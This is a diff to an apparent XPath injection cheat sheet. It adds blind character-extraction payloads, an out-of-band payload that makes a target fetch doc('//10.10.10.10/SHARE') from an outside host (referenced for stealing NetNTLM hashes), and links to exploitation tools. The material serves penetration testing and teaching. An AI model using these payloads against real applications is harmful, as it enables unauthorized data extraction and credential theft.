@@ -1,6 +1,14 @@
 # XPATH injection
 
-XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
+> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
+
+## Summary
+
+* [Exploitation](#exploitation)
+* [Blind exploitation](#blind-exploitation)
+* [Out Of Band Exploitation](#out-of-band-exploitation)
+* [Tools](#tools)
+* [References](#references)
 
 ## Exploitation
 
@@ -24,16 +32,31 @@ x' or name()='username' or 'x'='y
 
 ## Blind Exploitation
 
-```sql
 1. Size of a string
-and string-length(account)=SIZE_INT
-
+    ```sql
+    and string-length(account)=SIZE_INT
+    ```
 2. Extract a character
-substring(//user[userid=5]/username,2,1)=CHAR_HERE
-substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+    ```sql
+    substring(//user[userid=5]/username,2,1)=CHAR_HERE
+    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+    ```
+
+## Out Of Band Exploitation
+
+```powershell
+http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
 ```
+
+## Tools
+
+- [xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
+- [xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool 
+- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text 
+- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
+- [XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool
 
 ## References
 
 * [OWASP XPATH Injection](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
-* [XPATH Blind Explorer](http://code.google.com/p/xpath-blind-explorer/)
+* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
